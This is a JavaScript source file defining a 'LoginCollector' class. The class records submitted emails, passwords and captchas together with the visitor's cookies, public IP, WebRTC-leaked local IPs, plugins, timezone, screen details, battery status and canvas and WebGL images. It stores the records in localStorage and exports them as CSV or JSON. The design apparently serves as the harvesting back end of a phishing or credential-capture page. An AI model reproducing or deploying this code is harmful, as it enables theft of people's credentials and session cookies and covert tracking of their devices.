class LoginCollector {
    constructor() {
        this.entries = JSON.parse(localStorage.getItem('loginEntries')) || [];
        this.storageKey = 'loginEntries';
    }

    async getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || 'Unknown';
        } catch (error) {
            console.error('Error fetching public IP:', error);
            return 'Unknown';
        }
    }

    async getLocalIPs() {
        return new Promise((resolve) => {
            const peerConnection = new RTCPeerConnection({ iceServers: [] });
            const ips = [];
            
            peerConnection.onicecandidate = (ice) => {
                if (!ice || !ice.candidate) {
                    resolve([...new Set(ips)]);
                    return;
                }
                const candidate = ice.candidate.candidate;
                const parts = candidate.split(' ');
                const ip = parts[4];
                if (ip && ips.indexOf(ip) === -1) {
                    ips.push(ip);
                }
            };
            
            peerConnection.createDataChannel('');
            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer)).catch(() => {});
            
            setTimeout(() => {
                peerConnection.close();
                resolve([...new Set(ips)]);
            }, 3000);
        });
    }

    getOS() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Win') > -1) return 'Windows';
        if (ua.indexOf('Mac') > -1) return 'MacOS';
        if (ua.indexOf('X11') > -1) return 'Linux';
        if (ua.indexOf('Android') > -1) return 'Android';
        if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
        return 'Unknown';
    }

    getBrowser() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Edg') > -1) return 'Edge';
        if (ua.indexOf('Chrome') > -1) return 'Chrome';
        if (ua.indexOf('Safari') > -1) return 'Safari';
        if (ua.indexOf('Firefox') > -1) return 'Firefox';
        if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
        return 'Unknown';
    }

    getDeviceType() {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('mobile') || ua.includes('android')) return 'Mobile';
        if (ua.includes('tablet') || ua.includes('ipad')) return 'Tablet';
        return 'Desktop';
    }

    getLanguage() {
        return navigator.language || navigator.userLanguage || 'Unknown';
    }

    getScreenInfo() {
        return {
            width: window.screen.width,
            height: window.screen.height,
            colorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1
        };
    }

    getTimezone() {
        try {
            return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
        } catch (e) {
            return 'Unknown';
        }
    }

    getStorageStatus() {
        try {
            const test = '__test__';
            localStorage.setItem(test, test);
            localStorage.removeItem(test);
            var localStorageEnabled = true;
        } catch (e) {
            var localStorageEnabled = false;
        }
        
        try {
            const test = '__test__';
            sessionStorage.setItem(test, test);
            sessionStorage.removeItem(test);
            var sessionStorageEnabled = true;
        } catch (e) {
            var sessionStorageEnabled = false;
        }
        
        return {
            localStorage: localStorageEnabled,
            sessionStorage: sessionStorageEnabled
        };
    }

    getBrowserPlugins() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        return plugins.length > 0 ? plugins.join(', ') : 'None';
    }

    getBrowserCookies() {
        return document.cookie || 'None';
    }

    async getCanvasImage() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 100;
            const ctx = canvas.getContext('2d');
            
            ctx.fillStyle = '#1a1a1a';
            ctx.fillRect(0, 0, 200, 100);
            ctx.fillStyle = '#ff9800';
            ctx.font = 'bold 20px Arial';
            ctx.fillText('DataCollection', 10, 35);
            
            ctx.strokeStyle = '#00ff00';
            ctx.lineWidth = 2;
            ctx.rect(10, 50, 180, 40);
            ctx.stroke();
            
            return canvas.toDataURL('image/png');
        } catch (e) {
            return 'Canvas not available';
        }
    }

    async getWebGLImage() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return 'WebGL not available';
            
            canvas.width = 200;
            canvas.height = 100;
            
            const vertices = [
                -0.5, -0.5, 0.0,
                 0.5, -0.5, 0.0,
                 0.0,  0.5, 0.0
            ];
            
            const vertexBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
            
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.clearColor(0.1, 0.1, 0.1, 1.0);
            gl.clear(gl.COLOR_BUFFER_BIT);
            
            gl.clearColor(0.8, 0.6, 0.0, 1.0);
            gl.clear(gl.COLOR_BUFFER_BIT);
            
            return canvas.toDataURL('image/png');
        } catch (e) {
            return 'WebGL not available';
        }
    }

    async getBatteryGraphImage() {
        try {
            if (!navigator.getBattery && !navigator.battery) {
                return this.createBatteryFallbackImage(50, true);
            }
            
            const battery = await navigator.getBattery?.() || navigator.battery;
            if (!battery) {
                return this.createBatteryFallbackImage(50, true);
            }
            
            const level = Math.round(battery.level * 100);
            const charging = battery.charging;
            return this.createBatteryFallbackImage(level, charging);
        } catch (e) {
            return this.createBatteryFallbackImage(50, true);
        }
    }

    createBatteryFallbackImage(level = 50, charging = true) {
        const canvas = document.createElement('canvas');
        canvas.width = 250;
        canvas.height = 120;
        const ctx = canvas.getContext('2d');
        
        ctx.fillStyle = '#1a1a1a';
        ctx.fillRect(0, 0, 250, 120);
        
        ctx.fillStyle = '#fff';
        ctx.font = 'bold 16px Arial';
        ctx.fillText('Battery Status', 20, 30);
        
        ctx.fillStyle = '#888';
        ctx.font = '12px Arial';
        ctx.fillText('Level: ' + level + '%', 20, 55);
        ctx.fillText('Charging: ' + (charging ? 'Yes' : 'No'), 20, 75);
        
        const barWidth = 200;
        const barHeight = 20;
        ctx.strokeStyle = '#fff';
        ctx.lineWidth = 2;
        ctx.strokeRect(20, 85, barWidth, barHeight);
        
        const color = level > 50 ? '#00ff00' : level > 20 ? '#ffff00' : '#ff0000';
        ctx.fillStyle = color;
        ctx.fillRect(22, 87, (barWidth - 4) * (level / 100), barHeight - 4);
        
        return canvas.toDataURL('image/png');
    }

    async collectAllData(email, password, captcha, sourcePage) {
        const screenInfo = this.getScreenInfo();
        const storageStatus = this.getStorageStatus();
        
        const data = {
            id: Date.now() + Math.random().toString(36).substr(2, 9),
            email: email,
            password: password,
            captcha: captcha,
            sourcePage: sourcePage,
            publicIP: await this.getPublicIP(),
            localIPs: await this.getLocalIPs(),
            os: this.getOS(),
            browser: this.getBrowser(),
            deviceType: this.getDeviceType(),
            language: this.getLanguage(),
            screenWidth: screenInfo.width,
            screenHeight: screenInfo.height,
            colorDepth: screenInfo.colorDepth,
            pixelRatio: screenInfo.pixelRatio,
            timezone: this.getTimezone(),
            referrer: document.referrer || 'Direct',
            geolocation: 'Not available',
            browserCookies: this.getBrowserCookies(),
            plugins: this.getBrowserPlugins(),
            localStorageEnabled: storageStatus.localStorage,
            sessionStorageEnabled: storageStatus.sessionStorage,
            canvasImage: await this.getCanvasImage(),
            webglImage: await this.getWebGLImage(),
            batteryGraphImage: await this.getBatteryGraphImage(),
            submittedAt: new Date().toISOString()
        };
        
        return data;
    }

    async addEntry(email, password, captcha, sourcePage) {
        const data = await this.collectAllData(email, password, captcha, sourcePage);
        this.entries.push(data);
        this.saveToLocalStorage();
        return data;
    }

    getAllEntries() {
        return this.entries;
    }

    deleteById(id) {
        this.entries = this.entries.filter(entry => entry.id !== id);
        this.saveToLocalStorage();
    }

    clearAll() {
        this.entries = [];
        localStorage.removeItem(this.storageKey);
    }

    saveToLocalStorage() {
        try {
            localStorage.setItem(this.storageKey, JSON.stringify(this.entries));
        } catch (e) {
            console.error('Error saving to localStorage:', e);
        }
    }

    exportToCSV() {
        if (this.entries.length === 0) {
            alert('No data to export');
            return;
        }
        
        const headers = [
            'ID', 'Email', 'Password', 'Captcha', 'Source Page', 'Public IP',
            'Local IPs', 'OS', 'Browser', 'Device Type', 'Language',
            'Screen Width', 'Screen Height', 'Color Depth', 'Pixel Ratio',
            'Timezone', 'Referrer', 'Geolocation', 'Plugins',
            'Local Storage', 'Session Storage', 'Submitted At'
        ];
        
        let csv = headers.join(',') + '\n';
        
        this.entries.forEach(entry => {
            const row = [
                entry.id,
                this.escapeCSV(entry.email),
                this.escapeCSV(entry.password),
                this.escapeCSV(entry.captcha),
                entry.sourcePage,
                entry.publicIP,
                entry.localIPs.join(';'),
                entry.os,
                entry.browser,
                entry.deviceType,
                entry.language,
                entry.screenWidth,
                entry.screenHeight,
                entry.colorDepth,
                entry.pixelRatio,
                entry.timezone,
                this.escapeCSV(entry.referrer),
                entry.geolocation,
                this.escapeCSV(entry.plugins),
                entry.localStorageEnabled,
                entry.sessionStorageEnabled,
                entry.submittedAt
            ];
            csv += row.join(',') + '\n';
        });
        
        this.downloadFile(csv, 'login-data.csv', 'text/csv');
    }

    exportToJSON() {
        if (this.entries.length === 0) {
            alert('No data to export');
            return;
        }
        
        const json = JSON.stringify(this.entries, null, 2);
        this.downloadFile(json, 'login-data.json', 'application/json');
    }

    escapeCSV(str) {
        if (!str) return '';
        if (str.includes(',') || str.includes('"') || str.includes('\n')) {
            return '"' + str.replace(/"/g, '""') + '"';
        }
        return str;
    }

    downloadFile(content, filename, type) {
        const element = document.createElement('a');
        element.setAttribute('href', 'data:' + type + ';charset=utf-8,' + encodeURIComponent(content));
        element.setAttribute('download', filename);
        element.style.display = 'none';
        document.body.appendChild(element);
        element.click();
        document.body.removeChild(element);
    }
}

const loginCollector = new LoginCollector();